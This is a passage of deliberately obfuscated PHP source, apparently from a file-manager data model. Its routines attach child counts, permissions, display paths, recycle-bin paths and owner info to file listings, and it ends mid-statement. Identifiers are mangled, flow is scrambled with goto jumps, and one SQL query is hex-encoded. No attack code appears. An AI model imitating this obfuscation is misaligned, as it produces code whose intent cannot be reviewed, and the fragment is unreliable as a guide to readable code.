$E³¶öí÷‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BŠòâ»Ğ÷‹ = array_to_keyvalue($A±÷‹‹¿”Å, $E³¶öí÷‡[43], $E³¶öí÷‡[430]); $BŠòâ»Ğ÷‹ = array_filter(array_unique($BŠòâ»Ğ÷‹)); goto eŞãÑÖÉ³¬; cİæÙ£¿¸Ú: $b‘Ş±è„ = Model($E³¶öí÷‡[433])->field($D·»ÕÂÄ¡¡)->where($Bâ¹±ß˜œ)->select(); $b‘Ş±è„ = array_to_keyvalue($b‘Ş±è„, $E³¶öí÷‡[430]); $a²ÊâöÄ¯ã = Model($E³¶öí÷‡[434])->field($E³¶öí÷‡[435])->where($Bâ¹±ß˜œ)->select(); goto C÷¦½Â‚²Ş; C÷¦½Â‚²Ş: $a²ÊâöÄ¯ã = $a²ÊâöÄ¯ã ? $a²ÊâöÄ¯ã : array(); $bÁ×¶íº” = array(); foreach ($a²ÊâöÄ¯ã as $A‹ÂªòÍç) { if (!isset($bÁ×¶íº”[$A‹ÂªòÍç[$E³¶öí÷‡[430]]])) { $bÁ×¶íº”[$A‹ÂªòÍç[$E³¶öí÷‡[430]]] = array(); } $bÁ×¶íº”[$A‹ÂªòÍç[$E³¶öí÷‡[430]]][$A‹ÂªòÍç[$E³¶öí÷‡[101]]] = $A‹ÂªòÍç[$E³¶öí÷‡[370]]; } goto Dˆù·ËÏ¹„; Dˆù·ËÏ¹„: foreach ($A±÷‹‹¿”Å as &$bÍˆç…—§ù) { goto b¹‰é•Ûíµ; cŞ‚°Ñåë: unset($b‘Ş±è„[$EôÖñ÷‹åº][$E³¶öí÷‡[87]]); $eÙ¹ß¢Ë = is_array($bÁ×¶íº”[$EôÖñ÷‹åº]) ? $bÁ×¶íº”[$EôÖñ÷‹åº] : array(); $bÍˆç…—§ù[$E³¶öí÷‡[174]] = array_merge($eÙ¹ß¢Ë, $b‘Ş±è„[$EôÖñ÷‹åº]); goto b°‹„äè°é; b°‹„äè°é: if (isset($bÍˆç…—§ù[$E³¶öí÷‡[174]][$E³¶öí÷‡[437]])) { $bÍˆç…—§ù[$E³¶öí÷‡[437]] = json_decode($bÍˆç…—§ù[$E³¶öí÷‡[174]][$E³¶öí÷‡[437]], !0); unset($bÍˆç…—§ù[$E³¶öí÷‡[174]][$E³¶öí÷‡[437]]); } goto Då¦í¼Ú¾; b¹‰é•Ûíµ: $EôÖñ÷‹åº = $bÍˆç…—§ù[$E³¶öí÷‡[430]]; if (!$EôÖñ÷‹åº || !isset($b‘Ş±è„[$EôÖñ÷‹åº])) { continue; } $f¸³ÌïÁÔ¨ = $b‘Ş±è„[$EôÖñ÷‹åº]; goto C÷ìšÍÄ¯Ğ; C÷ìšÍÄ¯Ğ: $f¸³ÌïÁÔ¨[$E³¶öí÷‡[89]] = $bÍˆç…—§ù[$E³¶öí÷‡[89]]; $f¸³ÌïÁÔ¨[$E³¶öí÷‡[38]] = $bÍˆç…—§ù[$E³¶öí÷‡[38]]; self::$cacheFileInfo[$E³¶öí÷‡[436] . $EôÖñ÷‹åº] = $f¸³ÌïÁÔ¨; goto cŞ‚°Ñåë; Då¦í¼Ú¾: } goto aÖàí±†íô; eŞãÑÖÉ³¬: if (!$BŠòâ»Ğ÷‹) { return; } $Bâ¹±ß˜œ = array($E³¶öí÷‡[431] => array($E³¶öí÷‡[395], $BŠòâ»Ğ÷‹)); $D·»ÕÂÄ¡¡ = $E³¶öí÷‡[432]; goto cİæÙ£¿¸Ú; aÖàí±†íô: } protected function _listAppendSourceInfo(&$bËèÌ‘¶»œ, $aê©¨–Ö•ñ) { goto C¼´Ò’÷ÛÒ; C¼´Ò’÷ÛÒ: $FäéĞ‡ÅÒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!defined($FäéĞ‡ÅÒ[438])) { return; } $eõæäŠ´´ä = Model($FäéĞ‡ÅÒ[439])->listData(); goto e½Û“£½¤Ï; BÚİ‡±À’¯: $C¢êèÛÜóÚ = array_to_keyvalue_group($F‰˜ßæ±, $FäéĞ‡ÅÒ[380]); foreach ($bËèÌ‘¶»œ as &$D–Æ‚Œêö«) { $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]] = array($FäéĞ‡ÅÒ[441] => 0, $FäéĞ‡ÅÒ[442] => 0, $FäéĞ‡ÅÒ[443] => 0); if (isset($Dó°ºß‚ƒË[$D–Æ‚Œêö«[$FäéĞ‡ÅÒ[380]]])) { $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]][$FäéĞ‡ÅÒ[444]] = 1; $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]][$FäéĞ‡ÅÒ[445]] = $Dó°ºß‚ƒË[$D–Æ‚Œêö«[$FäéĞ‡ÅÒ[380]]][$FäéĞ‡ÅÒ[38]]; } if (isset($FÄ˜à›½¿Œ[$D–Æ‚Œêö«[$FäéĞ‡ÅÒ[380]]])) { $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]][$FäéĞ‡ÅÒ[446]] = array(); foreach ($FÄ˜à›½¿Œ[$D–Æ‚Œêö«[$FäéĞ‡ÅÒ[380]]] as $dî´¯¨ò÷É) { $C™Ñ¡¥İ›• = $cî«İ£îÑ‡[$dî´¯¨ò÷É]; $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]][$FäéĞ‡ÅÒ[446]][] = array($FäéĞ‡ÅÒ[447] => $C™Ñ¡¥İ›•[$FäéĞ‡ÅÒ[378]], $FäéĞ‡ÅÒ[397] => $C™Ñ¡¥İ›•[$FäéĞ‡ÅÒ[38]], $FäéĞ‡ÅÒ[448] => $C™Ñ¡¥İ›•[$FäéĞ‡ÅÒ[449]]); } } if (isset($C¢êèÛÜóÚ[$D–Æ‚Œêö«[$FäéĞ‡ÅÒ[380]]])) { $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]][$FäéĞ‡ÅÒ[450]] = array(); foreach ($C¢êèÛÜóÚ[$D–Æ‚Œêö«[$FäéĞ‡ÅÒ[380]]] as $aÆØ¡Äİ‡) { $D–Æ‚Œêö«[$FäéĞ‡ÅÒ[402]][$FäéĞ‡ÅÒ[450]] = array($FäéĞ‡ÅÒ[451] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[452]], $FäéĞ‡ÅÒ[453] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[454]], $FäéĞ‡ÅÒ[455] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[380]], $FäéĞ‡ÅÒ[456] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[457]], $FäéĞ‡ÅÒ[458] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[459]], $FäéĞ‡ÅÒ[460] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[460]], $FäéĞ‡ÅÒ[461] => $aÆØ¡Äİ‡[$FäéĞ‡ÅÒ[461]]); } } } return $bËèÌ‘¶»œ; goto CšéÜÌ‰ã; E— á†æƒÈ: $cî«İ£îÑ‡ = array_to_keyvalue($eõæäŠ´´ä, $FäéĞ‡ÅÒ[378]); $FÄ˜à›½¿Œ = array_to_keyvalue_group($EùËœÎã¼, $FäéĞ‡ÅÒ[87], $FäéĞ‡ÅÒ[404]); $Dó°ºß‚ƒË = array_to_keyvalue($fŒÎ„¸Ÿ‚‰, $FäéĞ‡ÅÒ[87]); goto BÚİ‡±À’¯; e½Û“£½¤Ï: $EùËœÎã¼ = Model($FäéĞ‡ÅÒ[403])->listData(); $fŒÎ„¸Ÿ‚‰ = Model($FäéĞ‡ÅÒ[392])->listData(); $F‰˜ßæ± = Model($FäéĞ‡ÅÒ[440])->listSimple(); goto E— á†æƒÈ; CšéÜÌ‰ã: } protected function _listAppendChildren(&$FÌÌ¼‹Ùæ, $a‹·èÁ¸ÖÑ) { goto bğÕÑ¯×Û; b†Îê•öÓ÷: foreach ($FÌÌ¼‹Ùæ as &$C´¥¡šÕ»œ) { if ($C´¥¡šÕ»œ[$b»Ì…Ù‚ÆÌ[381]]) { unset($C´¥¡šÕ»œ[$b»Ì…Ù‚ÆÌ[383]]); $C´¥¡šÕ»œ[$b»Ì…Ù‚ÆÌ[204]] = intval($F…¯…«æØ[$C´¥¡šÕ»œ[$b»Ì…Ù‚ÆÌ[380]] . $b»Ì…Ù‚ÆÌ[464]][$b»Ì…Ù‚ÆÌ[465]]); $C´¥¡šÕ»œ[$b»Ì…Ù‚ÆÌ[203]] = intval($F…¯…«æØ[$C´¥¡šÕ»œ[$b»Ì…Ù‚ÆÌ[380]] . $b»Ì…Ù‚ÆÌ[466]][$b»Ì…Ù‚ÆÌ[465]]); } } goto d·¢á†¾•; bğÕÑ¯×Û: $b»Ì…Ù‚ÆÌ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C©’Ë³…÷ = $b»Ì…Ù‚ÆÌ[372]; $F…¯…«æØ = array(); goto eİĞ¬Êòùò; eÄ ïóëÊ©: $fÍ™Êùö— = $this->tablePrefix . $this->tableName; for ($D³Óë›ã¢Â = 0; $D³Óë›ã¢Â < $b¾©›ãÏ²; $D³Óë›ã¢Â++) { $e´Ù¨±¸²Ü = intval($FÌÌ¼‹Ùæ[$D³Óë›ã¢Â][$b»Ì…Ù‚ÆÌ[408]]); if ($FÌÌ¼‹Ùæ[$D³Óë›ã¢Â][$b»Ì…Ù‚ÆÌ[381]]) { $A…Ùíî¥†Ã = $FÌÌ¼‹Ùæ[$D³Óë›ã¢Â][$b»Ì…Ù‚ÆÌ[380]]; $C©’Ë³…÷ .= "\123\105\x4c\105\x43\x54\40\52\x20\x46\122\117\x4d\40\50\123\105\114\105\103\124\40\47{$A…Ùíî¥†Ã}\x5f\x68\141\x73\106\151\x6c\145\x27\40\x61\x73\x20\x68\x61\163\54\x63\x6f\165\156\x74\x28\x31\x29\40\x61\x73\x20\150\141\x73\x43\157\x75\x6e\x74\40\106\x52\x4f\x4d\x20\140{$fÍ™Êùö—}\x60\40\12\x9\11\11\11\11\x77\150\145\162\145\x20\x70\x61\x72\x65\156\x74\111\x44\75{$A…Ùíî¥†Ã}\40\x61\x6e\144\40\x69\163\106\157\x6c\x64\x65\x72\75\60\40\x61\156\144\40\151\x73\x44\x65\x6c\x65\164\145\x3d{$e´Ù¨±¸²Ü}\51\40\x61\163\x20\x74\142\x31\x5f{$A…Ùíî¥†Ã}\x20\x75\x6e\x69\x6f\x6e\x20\141\x6c\154\40\xa\11\x9\x9\11\x9\123\105\x4c\105\x43\124\x20\52\40\x46\x52\117\115\x20\50\x53\105\114\105\x43\124\40\x27{$A…Ùíî¥†Ã}\137\150\141\x73\x46\157\154\144\145\162\x27\x20\141\163\40\x68\x61\163\x46\x69\x6c\145\x2c\143\157\165\x6e\164\50\x31\51\x20\x61\163\x20\x68\141\x73\x43\157\165\x6e\164\40\106\x52\117\115\x20\140{$fÍ™Êùö—}\x60\40\12\x9\11\x9\x9\x9\167\x68\145\x72\x65\40\160\x61\x72\145\156\164\x49\x44\x3d{$A…Ùíî¥†Ã}\40\141\x6e\144\40\x69\163\x46\157\154\x64\x65\162\75\x31\40\x61\x6e\x64\40\151\163\104\x65\154\145\x74\x65\75{$e´Ù¨±¸²Ü}\x29\x20\141\163\x20\x74\x62\62\x5f{$A…Ùíî¥†Ã}\40\165\156\x69\157\156\x20\141\x6c\x6c\40"; } if ((strlen($C©’Ë³…÷) >= $f¦ïéåÓçµ || $D³Óë›ã¢Â == $b¾©›ãÏ² - 1) && $C©’Ë³…÷) { $C©’Ë³…÷ = substr($C©’Ë³…÷, 0, -strlen($b»Ì…Ù‚ÆÌ[462])); $cˆŸÚÉŠ¢ê = $this->query($C©’Ë³…÷); $F…¯…«æØ = array_merge($F…¯…«æØ, $cˆŸÚÉŠ¢ê); $C©’Ë³…÷ = $b»Ì…Ù‚ÆÌ[43]; } } $F…¯…«æØ = array_to_keyvalue($F…¯…«æØ, $b»Ì…Ù‚ÆÌ[463]); goto b†Îê•öÓ÷; eİĞ¬Êòùò: $f¦ïéåÓçµ = 1024 * 50; $FÌÌ¼‹Ùæ = is_array($FÌÌ¼‹Ùæ) ? $FÌÌ¼‹Ùæ : array(); $b¾©›ãÏ² = count($FÌÌ¼‹Ùæ); goto eÄ ïóëÊ©; d·¢á†¾•: } protected function _listAppendAuth(&$e÷¢’óÌ) { goto F¥™¶¹ñ‹ö; CÈ³‹‘í‘: foreach ($e÷¢’óÌ as $d£†Î•ƒ‹Ü) { if ($d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[382]] == self::TYPE_GROUP) { $C¢¸ĞõÊô[] = $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[380]]; } } if (!$C¢¸ĞõÊô) { return; } $fŒÆ“ò¿× = array_to_keyvalue($e÷¢’óÌ, $Dù³ÅğäÌÉ[380]); goto E…¡Ú±Îâ‰; E…¡Ú±Îâ‰: $F±±¤ª‘¿ø = Model($Dù³ÅğäÌÉ[467])->getSourceList($C¢¸ĞõÊô, $fŒÆ“ò¿×); foreach ($e÷¢’óÌ as $EÁÁ£‡ÉÎÅ => &$d£†Î•ƒ‹Ü) { $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]] = $F±±¤ª‘¿ø[$d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[380]]]; if (!$d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]] && $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[382]] == self::TYPE_GROUP) { $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]] = Action($Dù³ÅğäÌÉ[468])->pathGroupAuthMake($d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[469]]); if (!$d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]] && !_get($GLOBALS, $Dù³ÅğäÌÉ[470])) { $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[201]] = !1; $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[200]] = !1; } } if ($d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]]) { $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[201]] = AuthModel::authCheckEdit($d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]][$Dù³ÅğäÌÉ[388]]); $d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[200]] = AuthModel::authCheckView($d£†Î•ƒ‹Ü[$Dù³ÅğäÌÉ[387]][$Dù³ÅğäÌÉ[388]]); } $this->groupPathDisplay($d£†Î•ƒ‹Ü); } goto CÚäÌ‡—ŠÙ; F¥™¶¹ñ‹ö: $Dù³ÅğäÌÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!defined($Dù³ÅğäÌÉ[438])) { return; } $C¢¸ĞõÊô = array(); goto CÈ³‹‘í‘; CÚäÌ‡—ŠÙ: } public function groupPathDisplay(&$E¯ùîÆ‰÷) { goto dª©ï¯ê»; DˆŒ“ë•–†: $E¯ùîÆ‰÷[$EÇ„áÍ¢º‚[477]] = $fÔ÷æèé . $Dê…â·íÏ[$EÇ„áÍ¢º‚[402]][$EÇ„áÍ¢º‚[380]]; goto e‘ÈÍ§‘Ã; bğ£‹»Œº: $E¯ùîÆ‰÷[$EÇ„áÍ¢º‚[473]] = $Dê…â·íÏ[$EÇ„áÍ¢º‚[474]]; $E¯ùîÆ‰÷[$EÇ„áÍ¢º‚[391]] = $Dê…â·íÏ[$EÇ„áÍ¢º‚[472]]; $E¯ùîÆ‰÷[$EÇ„áÍ¢º‚[475]] = $Dê…â·íÏ[$EÇ„áÍ¢º‚[476]]; goto DˆŒ“ë•–†; dª©ï¯ê»: $EÇ„áÍ¢º‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($E¯ùîÆ‰÷[$EÇ„áÍ¢º‚[382]] != self::TYPE_GROUP) { return; } $Dê…â·íÏ = Model($EÇ„áÍ¢º‚[471])->getInfo($E¯ùîÆ‰÷[$EÇ„áÍ¢º‚[469]]); goto DÖË‘Ú—; DÖË‘Ú—: $b£¬òŠ†Î» = $this->parentLevelArray($Dê…â·íÏ[$EÇ„áÍ¢º‚[472]]); $fÔ÷æèé = $EÇ„áÍ¢º‚[43]; foreach ($b£¬òŠ†Î» as $c»ÆÁ¿‘„) { $Dœƒì¼©å = Model($EÇ„áÍ¢º‚[471])->getInfo($c»ÆÁ¿‘„); $fÔ÷æèé .= $Dœƒì¼©å[$EÇ„áÍ¢º‚[402]][$EÇ„áÍ¢º‚[380]] . $EÇ„áÍ¢º‚[57]; } goto bğ£‹»Œº; e‘ÈÍ§‘Ã: } protected function _listAppendPath(&$FĞ¤¦Šç¨) { goto B¼ŸŒ†¹îí; B¼ŸŒ†¹îí: $BçŸÚ¶Ê’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C°ñÙë¦¡Â = array(); foreach ($FĞ¤¦Šç¨ as &$AÎ¼»É‡š¬) { $C°ñÙë¦¡Â[$AÎ¼»É‡š¬[$BçŸÚ¶Ê’[380]]] = $AÎ¼»É‡š¬[$BçŸÚ¶Ê’[38]]; $Dîè–Æë‰À = $this->parentLevelArray($AÎ¼»É‡š¬[$BçŸÚ¶Ê’[472]]); array_shift($Dîè–Æë‰À); foreach ($Dîè–Æë‰À as $dïÙ¢¸¾ì¹) { if (!isset($C°ñÙë¦¡Â[$dïÙ¢¸¾ì¹])) { $C°ñÙë¦¡Â[$dïÙ¢¸¾ì¹] = 0; } } } goto cÏ¯±§ÄÂ“; cÏ¯±§ÄÂ“: $f†•°¹‹ = array(); foreach ($C°ñÙë¦¡Â as $DğÌ®ŸÎ•Â => $e’éêÊ) { if (!$e’éêÊ) { $f†•°¹‹[] = $DğÌ®ŸÎ•Â; } } if ($f†•°¹‹) { $F…çÔõÓ = array($BçŸÚ¶Ê’[394] => array($BçŸÚ¶Ê’[395], $f†•°¹‹)); if (count($f†•°¹‹) == 1) { $e…ä¹–– = $this->sourceInfo($f†•°¹‹[0]); $e…ä¹–– = is_array($e…ä¹––) ? array($e…ä¹––) : !1; } else { $e…ä¹–– = $this->field($BçŸÚ¶Ê’[478])->where($F…çÔõÓ)->select(); } $D¯Ëšæ„· = array_to_keyvalue($e…ä¹––, $BçŸÚ¶Ê’[380], $BçŸÚ¶Ê’[38]); $C°ñÙë¦¡Â = array_merge_index($C°ñÙë¦¡Â, $D¯Ëšæ„·); } goto A‰Œ†šÔÛŞ; A‰Œ†šÔÛŞ: $cÛğ®­…‡´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($FĞ¤¦Šç¨ as &$AÎ¼»É‡š¬) { goto cµó¯Ë‡Ü; cµó¯Ë‡Ü: $Dîè–Æë‰À = $this->parentLevelArray($AÎ¼»É‡š¬[$BçŸÚ¶Ê’[472]]); $d“¹ùİğ¸î = $this->_listAppendPathRoot($AÎ¼»É‡š¬, $Dîè–Æë‰À); foreach ($Dîè–Æë‰À as $dïÙ¢¸¾ì¹) { if (isset($C°ñÙë¦¡Â[$dïÙ¢¸¾ì¹])) { $d“¹ùİğ¸î .= $C°ñÙë¦¡Â[$dïÙ¢¸¾ì¹] . $BçŸÚ¶Ê’[18]; } } goto bàÏä×À¹¼; Fƒƒòºî: $BÖº¶„„¨† = trim($AÎ¼»É‡š¬[$BçŸÚ¶Ê’[479]], $BçŸÚ¶Ê’[18]); if ($AÎ¼»É‡š¬[$BçŸÚ¶Ê’[474]] == $BçŸÚ¶Ê’[481] && $BÖº¶„„¨†) { $AÎ¼»É‡š¬[$BçŸÚ¶Ê’[38]] = $BÖº¶„„¨†; } $this->_listAppendPathRecycle($AÎ¼»É‡š¬, $Dîè–Æë‰À, $cÛğ®­…‡´); goto Aª•äˆÑÔ¶; bàÏä×À¹¼: if ($Dîè–Æë‰À) { $d“¹ùİğ¸î .= $AÎ¼»É‡š¬[$BçŸÚ¶Ê’[38]]; } if ($AÎ¼»É‡š¬[$BçŸÚ¶Ê’[381]]) { $d“¹ùİğ¸î .= $BçŸÚ¶Ê’[18]; } $AÎ¼»É‡š¬[$BçŸÚ¶Ê’[479]] = str_replace($BçŸÚ¶Ê’[480], $BçŸÚ¶Ê’[18], $d“¹ùİğ¸î); goto Fƒƒòºî; Aª•äˆÑÔ¶: } goto F³±ĞŞ; F³±ĞŞ: } private function _listAppendPathRecycle(&$D°ØÇê‡¨, $C’Äë“‘Ğô, $Bçé½Œ÷¬˜) { goto aŠ­àÁÊÊç; aŠ­àÁÊÊç: $bµ…³§†®ê =& $_SERVER[¹÷ˆ§éÒ°ú]; if (intval($D°ØÇê‡¨[$bµ…³§†®ê[382]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($Bçé½Œ÷¬˜, $C’Äë“‘Ğô) && $D°ØÇê‡¨[$bµ…³§†®ê[380]] != $Bçé½Œ÷¬˜) { return; } goto a…ÒéàêÂØ; f—î’·¦éÇ: $D°ØÇê‡¨[$bµ…³§†®ê[472]] = $bµ…³§†®ê[483] . implode($bµ…³§†®ê[57], array_slice($C’Äë“‘Ğô, 1)) . $bµ…³§†®ê[57]; if ($D°ØÇê‡¨[$bµ…³§†®ê[380]] == $Bçé½Œ÷¬˜) { $D°ØÇê‡¨[$bµ…³§†®ê[472]] = $bµ…³§†®ê[483]; $D°ØÇê‡¨[$bµ…³§†®ê[474]] = $bµ…³§†®ê[481]; $D°ØÇê‡¨[$bµ…³§†®ê[38]] = LNG($bµ…³§†®ê[482]); } $D°ØÇê‡¨[$bµ…³§†®ê[484]] = $bµ…³§†®ê[485]; goto e×”°ŒŒ–Ç; a…ÒéàêÂØ: $aõ‹‘Ä²Æ† = explode($bµ…³§†®ê[18], trim($D°ØÇê‡¨[$bµ…³§†®ê[479]], $bµ…³§†®ê[18])); $EéÑòİ’† = implode($bµ…³§†®ê[18], array_slice($aõ‹‘Ä²Æ†, 2)); $D°ØÇê‡¨[$bµ…³§†®ê[479]] = $bµ…³§†®ê[18] . LNG($bµ…³§†®ê[482]) . $bµ…³§†®ê[18] . ltrim($EéÑòİ’†, $bµ…³§†®ê[18]); goto f—î’·¦éÇ; e×”°ŒŒ–Ç: } protected function _listAppendPathRoot(&$c¼ÏÜ«Ò©, $B—†„áæ) { $CÍÌÑà»´ê =& $_SERVER[¹÷ˆ§éÒ°ú]; $b“–ñ‰ù”Ğ = $CÍÌÑà»´ê[43]; if ($c¼ÏÜ«Ò©[$CÍÌÑà»´ê[382]] == self::TYPE_USER) { if (defined($CÍÌÑà»´ê[438]) && $c¼ÏÜ«Ò©[$CÍÌÑà»´ê[469]] == USER_ID) { $b“–ñ‰ù”Ğ = LNG($CÍÌÑà»´ê[486]); if (!$B—†„áæ) { $c¼ÏÜ«Ò©[$CÍÌÑà»´ê[38]] = $b“–ñ‰ù”Ğ; } } else { $cŸØË÷ø¾ = Model($CÍÌÑà»´ê[487])->getInfoSimple($c¼ÏÜ«Ò©[$CÍÌÑà»´ê[469]]); $b“–ñ‰ù”Ğ = LNG($CÍÌÑà»´ê[488]) . $CÍÌÑà»´ê[169] . $cŸØË÷ø¾[$CÍÌÑà»´ê[38]] . $CÍÌÑà»´ê[489]; } } else { if ($c¼ÏÜ«Ò©[$CÍÌÑà»´ê[382]] == self::TYPE_GROUP) { $cŸØË÷ø¾ = Model($CÍÌÑà»´ê[471])->getInfoSimple($c¼ÏÜ«Ò©[$CÍÌÑà»´ê[469]]); $b“–ñ‰ù”Ğ = $cŸØË÷ø¾[$CÍÌÑà»´ê[38]]; } else { if ($c¼ÏÜ«Ò©[$CÍÌÑà»´ê[382]] == self::TYPE_SYSTEM) { $cŸØË÷ø¾ = $this->sourceInfo($B—†„áæ[0], !0); $b“–ñ‰ù”Ğ = $cŸØË÷ø¾[$CÍÌÑà»´ê[38]]; } } } $b“–ñ‰ù”Ğ = $b“–ñ‰ù”Ğ ? $CÍÌÑà»´ê[18] . $b“–ñ‰ù”Ğ . $CÍÌÑà»´ê[18] : $CÍÌÑà»´ê[18]; return $b“–ñ‰ù”Ğ; } protected function _listAppendUser(&$D‹ƒâò¹Í) { $A°µ»áß´õ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÍŠõß–­¬ = array_to_keyvalue($D‹ƒâò¹Í, $A°µ»áß´õ[43], $A°µ»áß´õ[389]); $B£‹ïµó£‡ = array_to_keyvalue($D‹ƒâò¹Í, $A°µ»áß´õ[43], $A°µ»áß´õ[390]); $cŞ¯¶Û›– = array_merge($eÍŠõß–­¬, $B£‹ïµó£‡); $C²„×ÈÂá¿ = Model($A°µ»áß´õ[490])->userListInfo($cŞ¯¶Û›–); foreach ($D‹ƒâò¹Í as &$A—¸¸óÎâÔ) { $AâŠÆÇ½¼ğ = $A—¸¸óÎâÔ[$A°µ»áß´õ[389]]; $A—¸¸óÎâÔ[$A°µ»áß´õ[389]] = $C²„×ÈÂá¿[$AâŠÆÇ½¼ğ] ? $C²„×ÈÂá¿[$AâŠÆÇ½¼ğ] : !1; $AâŠÆÇ½¼ğ = $A—¸¸óÎâÔ[$A°µ»áß´õ[390]]; $A—¸¸óÎâÔ[$A°µ»áß´õ[390]] = $C²„×ÈÂá¿[$AâŠÆÇ½¼ğ] ? $C²„×ÈÂá¿[$AâŠÆÇ½¼ğ] : !1; if (isset($A—¸¸óÎâÔ[$A°µ»áß´õ[428]]) && $A—¸¸óÎâÔ[$A°µ»áß´õ[428]][$A°µ»áß´õ[491]]) { $Eèİ¢–·° = $GLOBALS[$A°µ»áß´õ[16]][$A°µ»áß´õ[96]][$A°µ»áß´õ[492]]; if ($A—¸¸óÎâÔ[$A°µ»áß´õ[428]][$A°µ»áß´õ[493]] <= time() - $Eèİ¢–·°) { $this->metaSet($A—¸¸óÎâÔ[$A°µ»áß´õ[380]], $A°µ»áß´õ[491], null); $this->metaSet($A—¸¸óÎâÔ[$A°µ»áß´õ[380]], $A°µ»áß´õ[493], null); unset($A—¸¸óÎâÔ[$A°µ»áß´õ[428]][$A°µ»áß´õ[491]]); continue; } $fŒ·£‰îĞÇ = $A—¸¸óÎâÔ[$A°µ»áß´õ[428]][$A°µ»áß´õ[491]]; $A—¸¸óÎâÔ[$A°µ»áß´õ[428]][$A°µ»áß´õ[494]] = Model($A°µ»áß´õ[490])->getInfoSimpleOuter($fŒ·£‰îĞÇ); } } } public function parentLevelArray($Bóç»Ç›…†) { $FÇˆƒ¼ñä =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bóç»Ç›…† = explode($FÇˆƒ¼ñä[57], trim($Bóç»Ç›…†, $FÇˆƒ¼ñä[57])); return array_remove_value($Bóç»Ç›…†, $FÇˆƒ¼ñä[481]); } public function listAll($C…Ûõ™õ¸) { goto d©ô‡Æ„©; d»ò­Ù—¢»: $F–Ûõï¤Êé = array_to_keyvalue($F–Ûõï¤Êé, $AŒ Ò¡×Û[380]); $eô‹Óß®…£ = "\x2f{$bÀ÷ŸÙ©İÜ[$AŒ Ò¡×Û[38]]}\x2f"; $eô‹Óß®…£ = $eô‹Óß®…£ == $AŒ Ò¡×Û[480] ? $AŒ Ò¡×Û[18] : $eô‹Óß®…£; goto e©›Éï‚¦; d©ô‡Æ„©: $AŒ Ò¡×Û =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÀ÷ŸÙ©İÜ = $this->sourceInfo($C…Ûõ™õ¸); $aÉÎ±ËêÚÄ = array($AŒ Ò¡×Û[495] => array($AŒ Ò¡×Û[496], $bÀ÷ŸÙ©İÜ[$AŒ Ò¡×Û[472]] . $C…Ûõ™õ¸ . $AŒ Ò¡×Û[497]), $AŒ Ò¡×Û[498] => 0); goto A˜­ğÊ‰”î; e©›Éï‚¦: $bçŒæ«…«Â = array(); foreach ($F–Ûõï¤Êé as $eñˆ…ãÌİÕ => $EÔ¼¸ÈøÎá) { goto e÷Œ¤¹ÎÓÈ; Fï›©ğ‚Õ°: if (!$EÔ¼¸ÈøÎá[$AŒ Ò¡×Û[381]]) { $Cõõë×Ùª¼[$AŒ Ò¡×Û[430]] = $EÔ¼¸ÈøÎá[$AŒ Ò¡×Û[430]]; $Cõõë×Ùª¼[$AŒ Ò¡×Û[502]] = $EÔ¼¸ÈøÎá[$AŒ Ò¡×Û[87]]; } $bçŒæ«…«Â[] = $Cõõë×Ùª¼; goto EŸšõ»Äë; e÷Œ¤¹ÎÓÈ: $dÓÆ­Ú´Ä = $this->parentLevelArray($EÔ¼¸ÈøÎá[$AŒ Ò¡×Û[472]]); array_shift($dÓÆ­Ú´Ä); $FÌ˜«Æ¿Éø = $eô‹Óß®…£; goto AéêÏÖ³ö¶; Fõš¶Úô’: $FÌ˜«Æ¿Éø = str_replace($AŒ Ò¡×Û[480], $AŒ Ò¡×Û[18], $FÌ˜«Æ¿Éø); $FÌ˜«Æ¿Éø = str_replace($AŒ Ò¡×Û[480], $AŒ Ò¡×Û[18], $FÌ˜«Æ¿Éø); $Cõõë×Ùª¼ = array($AŒ Ò¡×Û[398] => str_replace($AŒ Ò¡×Û[480], $AŒ Ò¡×Û[18], $FÌ˜«Æ¿Éø), $AŒ Ò¡×Û[501] => intval($EÔ¼¸ÈøÎá[$AŒ Ò¡×Û[381]]), $AŒ Ò¡×Û[402] => $this->pathInfoFilter($EÔ¼¸ÈøÎá, !0)); goto Fï›©ğ‚Õ°; AéêÏÖ³ö¶: for ($dòíœ‰âºâ = 0; $dòíœ‰âºâ < count($dÓÆ­Ú´Ä); $dòíœ‰âºâ++) { $FÌ˜«Æ¿Éø .= $F–Ûõï¤Êé[$dÓÆ­Ú´Ä[$dòíœ‰âºâ]][$AŒ Ò¡×Û[38]] . $AŒ Ò¡×Û[18]; } $FÌ˜«Æ¿Éø .= $EÔ¼¸ÈøÎá[$AŒ Ò¡×Û[38]]; if ($EÔ¼¸ÈøÎá[$AŒ 